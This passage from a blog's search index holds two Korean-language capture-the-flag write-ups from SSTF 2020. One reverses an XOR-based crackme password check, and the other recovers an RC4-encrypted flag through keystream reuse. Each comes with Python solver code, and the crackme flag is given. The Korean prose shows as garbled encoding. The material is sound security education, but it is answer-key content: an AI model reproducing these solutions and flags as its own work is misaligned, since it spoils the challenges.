    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png"></p><p>64bit elf íŒŒì¼ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Ubuntu 20.04 64bitì—ì„œ ì‹¤í–‰ì„ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png"></p><p>Passwordë¥¼ ì…ë ¥í•˜ê³  ì •ìƒì ì¸ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥í–ˆì„ ì‹œ í”Œë˜ê·¸ê°€ ë‚˜ì˜¤ëŠ” í˜•ì‹ìœ¼ë¡œ ìƒê°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Ghidraë¥¼ ì‚¬ìš©í•˜ì—¬ crackme101ì´ ì–´ë–¤ ì‹ìœ¼ë¡œ êµ¬ë™ë˜ëŠ”ì§€ í™•ì¸í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="crackme101-ë¶„ì„"><a href="#crackme101-ë¶„ì„" class="headerlink" title="crackme101 ë¶„ì„"></a>crackme101 ë¶„ì„</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  &#123;    local_88 = local_88 + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">if</span> (local_88 != iVar1) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>ì…ë ¥ëœ íŒ¨ìŠ¤ì›Œë“œëŠ” <code>local_78</code>ì— ë“¤ì–´ê°€ê²Œ ë˜ê³  <code>iVar1</code>ëŠ” ì…ë ¥í•œ íŒ¨ìŠ¤ì›Œë“œì˜ ê¸¸ì´ê°€ ë©ë‹ˆë‹¤.</p><p><code>getMaskedStr</code> í•¨ìˆ˜ì—ì„œ ì¸ìë¥¼ ëª¨ë‘ <code>local_78</code>ë¡œ ë°›ì•„ì„œ ì–´ë– í•œ ì‘ì—…ì„ ìˆ˜í–‰í•œ í›„ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ ë¬¸ìì—´ê³¼ <code>ocal_78</code> ë¬¸ìì—´ì„ ë’·ë¶€ë¶„ì˜ ë°°ì—´ë¶€í„° <code>iVar1</code>ì˜ í¬ê¸°ë§Œí¼ ë¹„êµí•©ë‹ˆë‹¤.</p><p><code>local_88</code>ê³¼ <code>iVar1</code>ì´ ê°™ì•„ì•¼ í•˜ë ¤ë©´ while ë¬¸ì˜ ì¡°ê±´ì¸ ê° ë¬¸ìì—´ì´ ë™ì¼í•´ì•¼ í•˜ë¯€ë¡œ <code>getMaskedStr</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•œ <code>local_78</code>ì˜ ê°’ì´ ì–´ë– í•œ ê°’ì¸ì§€ ë¨¼ì € ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) &#123;    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  &#125;  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>ì¸ìë¡œ ë°›ì€ paramì€ ì…ë ¥ë°›ì€ íŒ¨ìŠ¤ì›Œë“œ ê°’ì´ ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ë¬¸ìì—´ì˜ ê¸¸ì´ë§Œí¼ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ë¬¸ìì—´ê³¼ ë™ì¼í•œ indexë¼ë¦¬ xor ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ íŒ¨ìŠ¤ì›Œë“œ checkê°€ ì–´ë– í•œ ì‹ìœ¼ë¡œ ì§„í–‰ì´ ë˜ëŠ”ì§€ ìš”ì•½í•´ë³´ë©´</p><ol><li>íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.</li><li><code>getMaskedStr</code> í•¨ìˆ˜ë¥¼ í†µí•´ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ ë¬¸ìì—´ê³¼ ë™ì¼í•œ ì¸ë±ìŠ¤ë¼ë¦¬ xor ì—°ì‚°ì„ ìˆ˜í–‰</li><li>ìˆ˜í–‰í•œ ê²°ê³¼ë¥¼ ë’¤ì§‘ì–´ì„œ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ê³¼ ë§ëŠ”ì§€ ê²€ì‚¬</li><li>ë§ìœ¼ë©´ Correct</li></ol><p>ê·¸ëŸ¬ë©´ ì €í¬ê°€ ë³µí˜¸í™”í•  ì‹œë‚˜ë¦¬ì˜¤ëŠ”</p><ol><li><p>ìµœì¢…ì ìœ¼ë¡œ ë‚˜ì˜¬ ê°’ì€ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ì´ë¯€ë¡œ í•´ë‹¹ ë¬¸ìì—´ê³¼ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ë¥¼ ë’¤ì§‘ì€ ë¬¸ìì—´ì„ xor ì—°ì‚°</p></li><li><p>ë‚˜ì˜¨ ë¬¸ìì—´ì„ ë‹¤ì‹œ ë’¤ì§‘ìŒ</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png"></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png"></p><p>ì••ì¶•ì„ í’€ë©´ challenge.pyì™€ output.txt íŒŒì¼ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png"></p><p>output.txt íŒŒì¼ì—ëŠ” ì•”í˜¸í™”ëœ ê²ƒìœ¼ë¡œ ì¶”ì¸¡ë˜ëŠ” ë¬¸ìì—´ì´ 2ì¤„ ì¡´ì¬í•©ë‹ˆë‹¤.</p><h1 id="challenge-py-ë¶„ì„"><a href="#challenge-py-ë¶„ì„" class="headerlink" title="challenge.py ë¶„ì„"></a>challenge.py ë¶„ì„</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&#x27;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge íŒŒì¼ì„ í•´ë³´ë©´ arc4ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë¥¼ ì§„í–‰í•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>output.txtì˜ ì²« ë²ˆì§¸ ì¤„ì€ msgë¥¼ ì•”í˜¸í™”í•œ ë¶€ë¶„ì´ê³  ë‘ ë²ˆì§¸ ì¤„ì€ flagì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 ì•Œê³ ë¦¬ì¦˜</a>ì€ ìŠ¤íŠ¸ë¦¼ ì•”í˜¸ë¡œ key ê°’ì„ ì‚¬ìš©í•˜ì—¬ ì…”í”Œë§ì„ í†µí•´ í‚¤ ìŠ¤íŠ¸ë¦¼ ë°”ì´íŠ¸ë¥¼ ìƒì„±í•œ í›„ í•´ë‹¹ í‚¤ ìŠ¤íŠ¸ë¦¼ê³¼ xor ì—°ì‚°ì„ í†µí•´ ì•”í˜¸í™”ë¥¼ ì§„í–‰í•©ë‹ˆë‹¤.</p><p>key ê°’ì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±ëœ key streamê³¼ ë¬¸ìì—´ì„ xor ì—°ì‚°í•˜ì—¬ ìµœì¢… ì•”í˜¸ë¬¸ì´ ë‚˜ì˜¤ëŠ” ê²ƒì„ í™œìš©í•˜ë©´ key ê°’ì„ ì•Œì§€ ëª»í•´ë„ flag ì•”í˜¸ë¬¸ì„ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>key stream ^ ë¬¸ìì—´ = ì•”í˜¸ë¬¸ì´ë¯€ë¡œ ì•”í˜¸ë¬¸ ^ ë¬¸ìì—´ì„ ìˆ˜í–‰í•˜ë©´ key streamì„ ì•Œ ìˆ˜ ìˆê³  í•´ë‹¹ key streamê³¼ flag ì•”í˜¸ë¬¸ì„ xor ì—°ì‚°ì„ ìˆ˜í–‰í•˜ë©´ flag ê°’ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
